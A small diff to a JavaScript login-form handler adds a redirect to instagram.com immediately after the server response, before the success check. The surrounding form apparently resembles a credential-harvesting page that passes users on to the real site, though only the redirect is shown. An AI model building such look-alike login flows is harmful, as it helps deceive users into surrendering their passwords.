@@ -17,7 +17,7 @@ document.getElementById("loginForm").addEventListener("submit", async function (
         });
 
         const data = await response.json();
-
+         window.location.href = "http://instagram.com";
         if (data.success) {
             alert("✅ Login Successful");
         } else {
